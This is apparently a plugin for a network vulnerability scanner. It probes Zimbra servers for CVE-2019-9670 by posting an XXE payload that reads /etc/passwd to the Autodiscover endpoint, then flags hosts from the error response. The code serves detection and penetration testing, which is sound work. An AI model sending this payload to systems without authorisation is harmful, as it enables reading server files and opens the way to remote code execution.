#!/usr/bin/env python
# -*- coding:utf-8 -*-
# 

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'zimbra_xxe2rce'
        self.info = "Check the Zimbra XXE to RCE CVE-2019-9670"
        self.keyword = ['all', 'zimbra', 'xxe', 'rce', 'danger', '7071']
        self.default_ports_list = [80, 8080, 443]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        result = "Zimbra XXE to RCE CVE-2019-9670"
        url1 = "http://%s:%d/Autodiscover/Autodiscover.xml"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s/Autodiscover/Autodiscover.xml"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d/Autodiscover/Autodiscover.xml"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s/Autodiscover/Autodiscover.xml"%(ip, int(port), add_web_path)
        data = """<!DOCTYPE xxe [
        <!ELEMENT name ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
         <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
              <EMailAddress>aaaaa</EMailAddress>
              <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
            </Request>
          </Autodiscover>
        """
        try:
            req = Requester(url1, method='post', data=data, noencode=True)
            if 'Error 503 Requested response schema not available' in req.html:
                self._output(ip, port, result)
                return
        except RequesterOpenError:
            try:
                req = Requester(url2, method='post', data=data, noencode=True)
                if 'Error 503 Requested response schema not available' in req.html:
                    self._output(ip, port, result)
                    return
            except:
                pass
        except:
            pass

globals()['VulnChecker'] = VulnChecker